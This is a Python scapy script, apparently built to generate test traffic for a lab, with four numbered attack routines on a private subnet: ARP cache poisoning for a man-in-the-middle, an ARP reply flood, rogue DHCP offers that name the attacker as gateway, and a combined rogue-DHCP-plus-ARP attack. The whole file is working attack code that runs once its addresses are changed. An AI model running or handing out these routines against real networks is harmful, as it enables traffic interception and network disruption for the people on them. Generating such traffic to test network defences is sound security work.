import sys
import time
import random
from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, sendp

INTERFACE = "eth0"
GATEWAY_IP = "192.168.50.2"
VICTIM_IP = "192.168.50.10"
VICTIM_MAC = "42:e9:2c:a7:ad:1b"
ATTACKER_IP = "192.168.50.99"
ATTACKER_MAC = "ca:42:b5:bf:6a:7b"

def tc01_mitm_arp(duration=5):
    print(f"[*] TC-01: Running Classic MITM ARP Poisoning for {duration}s...")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC) / ARP(
        op=2,
        psrc=GATEWAY_IP,
        hwsrc=ATTACKER_MAC,
        pdst=VICTIM_IP,
        hwdst=VICTIM_MAC
    )
    end_time = time.time() + duration
    while time.time() < end_time:
        sendp(pkt, iface=INTERFACE, verbose=False)
        time.sleep(1.0)
    print("[+] TC-01 complete.")

def tc02_arp_flood(count=30):
    print(f"[*] TC-02: Sending {count} rapid ARP reply frames...")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC) / ARP(
        op=2,
        psrc="192.168.50.77",
        hwsrc=ATTACKER_MAC,
        pdst=VICTIM_IP,
        hwdst="ff:ff:ff:ff:ff:ff"
    )
    sendp(pkt, iface=INTERFACE, count=count, inter=0.02, verbose=False)
    print("[+] TC-02 complete.")

def tc03_rogue_dhcp(count=4):
    print(f"[*] TC-03: Broadcasting {count} Rogue DHCP Offers (30s short lease)...")
    for _ in range(count):
        xid = random.randint(1, 0xFFFFFFFF)
        pkt = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC) /
            IP(src=ATTACKER_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr="192.168.50.150", siaddr=ATTACKER_IP, chaddr=bytes.fromhex(VICTIM_MAC.replace(":", "")), xid=xid) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", ATTACKER_IP),
                ("lease_time", 30),
                ("subnet_mask", "255.255.255.0"),
                ("router", ATTACKER_IP),
                "end"
            ])
        )
        sendp(pkt, iface=INTERFACE, verbose=False)
        time.sleep(0.3)
    print("[+] TC-03 complete.")

def tc04_combined():
    print("[*] TC-04: Running Combined Blended Attack (Rogue DHCP + ARP Poisoning)...")
    tc03_rogue_dhcp(count=3)
    tc01_mitm_arp(duration=3)
    print("[+] TC-04 complete.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 simulate_attacks.py [1|2|3|4]")
        sys.exit(1)
    choice = sys.argv[1]
    if choice == "1": tc01_mitm_arp()
    elif choice == "2": tc02_arp_flood()
    elif choice == "3": tc03_rogue_dhcp()
    elif choice == "4": tc04_combined()
